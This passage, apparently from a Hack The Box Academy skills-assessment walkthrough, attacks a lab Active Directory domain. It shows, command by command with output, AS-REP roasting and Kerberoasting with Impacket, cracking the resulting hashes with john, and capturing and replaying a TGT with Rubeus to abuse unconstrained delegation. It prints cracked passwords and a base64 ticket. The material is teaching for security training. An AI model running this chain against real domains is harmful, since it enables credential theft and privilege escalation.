Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 1 hop
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-12-10T13:20:56
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:41:ed (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   3.40 ms INLANEFREIGHT.LOCAL (172.16.8.3)

Nmap scan report for 172.16.8.35
Host is up (0.0016s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-12-10T13:21:35+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: SERVER01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: SERVER01.INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2023-12-10T13:20:56+00:00
| ssl-cert: Subject: commonName=SERVER01.INLANEFREIGHT.LOCAL
| Not valid before: 2023-12-09T12:43:55
|_Not valid after:  2024-06-09T12:43:55
MAC Address: 00:50:56:B9:08:46 (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/10%OT=135%CT=1%CU=44686%PV=Y%DS=1%DC=D%G=Y%M=005056
OS:%TM=6575BB5F%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=102%TI=I%CI=I%II
OS:=I%SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5
OS:=M5B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF
OS:70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SERVER01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:08:46 (VMware)
| smb2-time: 
|   date: 2023-12-10T13:20:56
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   1.57 ms 172.16.8.35

Nmap scan report for 172.16.8.114
Host is up (0.0017s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 97:cc:9f:d0:a3:84:da:d1:a2:01:58:a1:f2:71:37:e5 (RSA)
|   256 03:15:a9:1c:84:26:87:b7:5f:8d:72:73:9f:96:e0:f2 (ECDSA)
|_  256 55:c9:4a:d2:63:8b:5f:f2:ed:7b:4e:38:e1:c9:f5:71 (ED25519)
3389/tcp open  ms-wbt-server xrdp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/10%OT=22%CT=1%CU=42144%PV=Y%DS=0%DC=L%G=Y%TM=6575BB
OS:78%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=MFFD7ST11NWA%O2=MFFD7ST11NWA%O3=MFFD7NNT11NWA%O4=MFFD7ST11NWA%O5=MF
OS:FD7ST11NWA%O6=MFFD7ST11)WIN(W1=FFCB%W2=FFCB%W3=FFCB%W4=FFCB%W5=FFCB%W6=F
OS:FCB)ECN(R=Y%DF=Y%T=40%W=FFD7%O=MFFD7NNSNWA%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Network Distance: 0 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Post-scan script results:
| clock-skew: 
|   0s: 
|     172.16.8.3 (INLANEFREIGHT.LOCAL)
|_    172.16.8.35
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 121.90 seconds
```

Students need to create an entry for the domain controller in `/etc/hosts` with the domain name `inlanefreight.local`:

Code: shell

```shell
sudo sh -c 'echo "172.16.8.3 inlanefreight.local" >> /etc/hosts'
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $sudo sh -c 'echo "172.16.8.3 inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to download [usersSA.zip](https://academy.hackthebox.com/storage/modules/25/usersSA.zip) and unzip it on `Pwnbox`/`PMVPN`:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/25/usersSA.zip && unzip usersSA.zip
```

```
┌─[htb-ac-413848@htb-aijozfzklp]─[~]
└──╼ $wget https://academy.hackthebox.com/storage/modules/25/usersSA.zip && unzip usersSA.zip

--2023-04-28 18:37:09--  https://academy.hackthebox.com/storage/modules/25/usersSA.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

Then, students need to transfer `usersSA.txt` to the attack-box. On the attack-box, students need to run `nc` to listen for connections on a port and redirect the stream it receives to a text file:

Code: shell

```shell
nc -lp PWNPO > usersSA.txt
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $nc -lp 7331 > usersSA.txt
```

While on `Pwnbox`/`PMVPN`, students need to use `nc` to send the file `usersSA.txt` to the socket on the attack-box:

Code: shell

```shell
┌─[htb-ac-413848@htb-aijozfzklp]─[~]
└──╼ $nc -w 3 STMIP PWNPO < users.txt
```

```
nc -w 3 10.129.23.122 7331 < users.txt
```

Afterward, students need to utilize `users.txt` to find `AS-REProastable` accounts using [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py), without authentication (i.e., utilizing the `-no-pass` flag); requesting the hashes in `John the Ripper`'s format is better in this case as the attack-box is not optimized for `hashcat`:

Code: shell

```shell
python3 /opt/impacket/examples/GetNPUsers.py inlanefreight/ -dc-ip 172.16.8.3 -usersfile usersSA.txt -outputfile ./ASREProastableHashes.txt -format john -no-pass
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $python3 /opt/impacket/examples/GetNPUsers.py inlanefreight/ -dc-ip 172.16.8.3 -usersfile usersSA.txt -outputfile ./ASREProastableHashes.txt -format john -no-pass

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[-] User alan.powell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User alison.herbert doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bernard.hughes doesn't have UF_DONT_REQUIRE_PREAUTH set
<SNIP>
```

When checking out the output file that `GetNPUsers.py` wrote to, students will find that the account `daniel.whitehead` does not have `Kerberos` `Preauthentication` enabled:

Code: shell

```shell
cat ASREProastableHashes.txt
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $cat ASREProastableHashes.txt

$krb5asrep$23$daniel.whitehead@INLANEFREIGHT:c31bc45a5fd5461644b64c56548bf1f6$551b338e2b55ea26ca430db8761feca3e965e5bce2b7cb9614097d155a004f8e67871719c09d74f4a1e5f2742f381c8abb09c36ec82e516b7ab8a317dd3e805e90e1476992c9dc168de247d15f3ea7260538775011b1e4b27b0467ee40d1d4ee7306130ff699a05453c1bcd3e1effdb76db092a82a3f3f6e71c329fab6a516c161192406abaa206f7783e2072dbfc162229cabe0f26eaa2d38a863ab5312dc191381d7eefbdb7a315b7e0cb310165a79bdcef117143de3d4f5a848e49dfdb268d65b392d081f220ae20593a3aa2c33f50e2d1b8ac97ed675a3025865d8787e1a051acb7d563e2e66d0a72028c6a89c64b159542a
```

Therefore, students need to use `john` to crack the password's hash, utilizing the format `krb5asrep`:

Code: shell

```shell
john --format=krb5asrep ASREProastableHashes.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $john --format=krb5asrep ASREProastableHashes.txt /usr/share/wordlists/rockyou.txt

Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 10 candidates buffered for the current salt, minimum 32 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
dolphin          ($krb5asrep$daniel.whitehead@INLANEFREIGHT)
1g 0:00:00:00 DONE 2/3 (2023-04-28 14:34) 5.000g/s 174180p/s 174180c/s 174180C/s 123456..random
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Students will find that the plaintext password of `daniel.whitehead@INLANEFREIGHT` is `dolphin`:

Code: shell

```shell
john --show ASREProastableHashes.txt
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $john --show ASREProastableHashes.txt

$krb5asrep$daniel.whitehead@INLANEFREIGHT:dolphin

1 password hash cracked, 0 left
```

Answer: `daniel.whitehead`

# Skills Assessment

## Question 2

### "Which machine has unconstrained delegation?"

With the previously harvested credentials `daniel.whitehead:dolphin`, students need to use [findDelegation.py](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py) to enumerate the accounts with delegation privileges, to find that `SERVER01` has unconstrained delegation set:

Code: shell

```shell
findDelegation.py inlanefreight.local/'daniel.whitehead:dolphin'
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $findDelegation.py inlanefreight.local/'daniel.whitehead:dolphin'

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

AccountName  AccountType  DelegationType  DelegationRightsTo 
-----------  -----------  --------------  ------------------
SERVER01$    Computer     Unconstrained   N/A
```

Answer: `SERVER01`

# Skills Assessment

## Question 3

### "Which user allows you to connect, as administrator, to the server with unconstrained delegation?"

Using the previously harvested credentials `daniel.whitehead:dolphin`, students need to utilize [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) to enumerate `Kerberoastable` accounts; students will find the user `annette.jackson`:

Code: shell

```shell
GetUserSPNs.py inlanefreight.local/'daniel.whitehead:dolphin'
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py inlanefreight.local/'daniel.whitehead:dolphin'

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

ServicePrincipalName           Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
-----------------------------  ---------------  --------  --------------------------  --------------------------  ----------
HTTP/inlanefreight.local:1433  annette.jackson            2022-10-15 12:54:52.593043  2023-04-12 17:34:58.479539
```

Subsequently, students need to utilize the credentials `daniel.whitehead:dolphin` to extract `annette.jackson`'s service account password hash with `GetUserSPNs.py`, specifying `annette.jackson` for the `-request-user` argument:

Code: shell

```shell
GetUserSPNs.py inlanefreight.local/'daniel.whitehead:dolphin' -request -outputfile ./annetteJacksonHash.txt -request-user annette.jackson
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py inlanefreight.local/'daniel.whitehead:dolphin' -request -outputfile ./annetteJacksonHash.txt -request-user annette.jacksonImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

ServicePrincipalName           Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
-----------------------------  ---------------  --------  --------------------------  --------------------------  ----------
HTTP/inlanefreight.local:1433  annette.jackson            2022-10-15 12:54:52.593043  2023-04-12 17:34:58.479539            
```

Thereafter, students need to crack the password's hash with `john`:

Code: shell

```shell
john annetteJacksonHash.txt
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $john annetteJacksonHash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
horses           (?)
1g 0:00:00:00 DONE 2/3 (2023-04-28 15:39) 33.33g/s 34133p/s 34133c/s 34133C/s 123456..random
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Students will find that the password's hash plaintext of `annette.jackson@INLANEFREIGHT` is `horses`:

Code: shell

```shell
john --show annetteJacksonHash.txt
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $john --show annetteJacksonHash.txt

?:horses

1 password hash cracked, 0 left
```

From the enumeration performed in the first question, students already know that `SERVER01` lives at `172.16.8.35/24`, therefore, they need to connect to it with `xfreerdp` using the credentials `annette.jackson:horses`:

Code: shell

```shell
xfreerdp /u:annette.jackson /p:horses /v:172.16.8.35 /dynamic-resolution
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $xfreerdp /u:annette.jackson /p:horses /v:172.16.8.35 /dynamic-resolution

[16:48:05:840] [2561:2564] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:48:05:840] [2561:2564] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:48:05:840] [2561:2564] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:48:05:840] [2561:2564] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[16:48:05:166] [2561:2564] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
<SNIP>
```

When checking the groups of `annette.jackson`, students will notice that the user belongs to `BUILTIN\Administrators`; therefore, the user that can connect to `SERVER01` as administrator with unconstrained delegation is `annette.jackson`:

Code: powershell

```powershell
whoami /groups
```

```
PS C:\Users\annette.jackson> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                     
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Group used for deny only                       
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192 
```

Answer: `annette.jackson`

# Skills Assessment

## Question 4

### "What's the content of the file: \\\\DC01\\Secret Share\\flag.txt?"

Using the RDP connection to `SERVER01` as `annette.jackson`, in a privileged PowerShell session, students need to navigate to `C:\Tools\` and use the [monitor](https://github.com/GhostPack/Rubeus#monitor) action of `Rubeus` to extract all TGTs used when attempting to authenticate to `SERVER01`; students will attain the TGT of the user `jake.kirk`:

Code: powershell

```powershell
.\Rubeus.exe monitor /interval:1 /nowrap
```

```
PS C:\Tools> .\Rubeus.exe monitor /interval:1 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs

<SNIP>

[*] 4/28/2023 9:08:55 PM UTC - Found new TGT:

  User                  :  jake.kirk@INLANEFREIGHT.LOCAL
  StartTime             :  4/28/2023 4:08:54 PM
  EndTime               :  4/29/2023 2:08:54 AM
  RenewTill             :  5/5/2023 4:08:54 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

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

[*] Ticket cache size: 3
```

Subsequently, students need to use the [createnetonly](https://github.com/GhostPack/Rubeus#createnetonly) action of `Rubeus` to create a `sacrificial process`, specifying `C:\Windows\System32\cmd.exe` for the `/program` parameter:

Code: powershell

```powershell
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

```
PS C:\Tools> .\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : True
[*] Username        : QZWLYLVO
[*] Domain          : E2KFTENY
[*] Password        : LMNELZGJ
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5536
[+] LUID            : 0x1e85f0
```

Within the new CMD session, students need to use the [renew](https://github.com/GhostPack/Rubeus#renew) action of `Rubeus` to request a new TGT for `jake.kirk` using the TGT previously attained by the `monitor` action, passing it to the current session with the `/ptt` parameter for the `CIFS/DC01` service:

```cmd
Rubeus.exe renew /ticket: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 /service:CIFS/DC01 /ptt
```
```
C:\Tools>Rubeus.exe renew /ticket:doIF7jCCBeqgAwIBBaEDAgEWooIE3TCCBNlhggTVMIIE0aADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggSHMIIEg6ADAgESoQMCAQOiggR1BIIEcRv1XXE9VEoW2wnL2KdCEFFkScvqxuKsRvviFGm+bOqcmRusTk++RwDea1vEvSlqisTkITLlujZaDLyfvHO/4Ev7qk9M/FMcQNu5j1D+kmOxba86wij/WS/srF8CGThnFwz/jtGUB8Cj39lUUCUBWRGRxZy49fOQxGVUT8QUAICWsu8j2mRB2Pp2jnjQI2unxG7POgg2FzBoVCcfvK5dGNm9OSO8a6gr1jOpCpI8FU3D/6Blm+lokpO/XBWq2LxXSNFVttZFJnbcYxnywUErdbWcTIjxiYFCZHZ+tBu4Qct0giUMsPAcy5OicHxR5y2KHF9IZMVNkdcTe9CZN2fjBw4d2cxkkDjFBJ1KejBCb91jT31VCdPlWCGmabNfYMiLe5Xxw+vHdr7hlnbfBGb3wlozoyT2u9ABtYbBcqoA5LF381zXUNsZQYckJVtH2VUqlV6nqX8XBLIrB/oRaxipK6LNeNW7X47WvvJaQIvEbrr4Nevl7piY24YTmNK0GnYuf3BzESC/l0HEosnLe5fBCWeLXtxTJWXQC2EFdBzPAdG782ZLNmlM5IHulBlVm5P/o7CEDnSOdho4P9MjUL64j98TTte2oUG6DVKjByGcYsnx82sinpLB1wJhJ6ilXZVsG8eMjqIvAgtXbGT3M8BaozUgbMg5IOYS1Lofb17h3D/4JUa6fruayMAQTS+R8KVB/JANUchvzAfZ3tE8yu+hRZI2kLe3RMebkPAbo5/J/j2xkj+ReE5wu4jlz4OVuEy8ShWVXGw1vogdnhfts8VYzkoVXXSjuT6U1Y0fE72GJkO0jYPajzm9UWDNrCZTXr5XAKpcmzLm86vB39PJGz5rG9YPYVvnvvujGAdgRTbyiYcTpzoUEIQyYOD0PD0/zPhM7+57BCFcON9vx7ylUE5C0yUaOy4kU7YDIHklrTWbAXBudc9Ygk/XjBiVOWOBDwoqPAbdEq5BcaKpHPGxJAmPD0VfPrc1qHcbeKap/4ToOydGkNa53uYxsaj04Vh/L8gp9XQ6m4zpRYi3cQ5Pdhd2WwTJ1vCxG4zJIGpk3uu6ab7rwGzjdwYD2sCc